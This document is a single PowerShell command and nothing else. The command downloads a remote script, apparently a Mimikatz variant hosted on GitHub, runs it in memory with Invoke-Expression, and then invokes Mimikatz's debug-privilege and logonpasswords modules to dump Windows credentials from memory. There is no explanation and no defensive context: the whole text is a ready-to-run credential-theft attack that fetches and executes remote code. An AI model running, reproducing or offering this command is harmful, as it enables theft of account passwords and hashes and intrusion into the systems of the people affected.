powershell -Command "Invoke-Expression ((New-Object Net.WebClient).DownloadString('https://github.com/bcaseiro/testing/mimi_bcaseiro.ps1')); Invoke-Mimikatz -Command 'Privilege::Debug Sekurlsa::Logonpasswords Exit'"


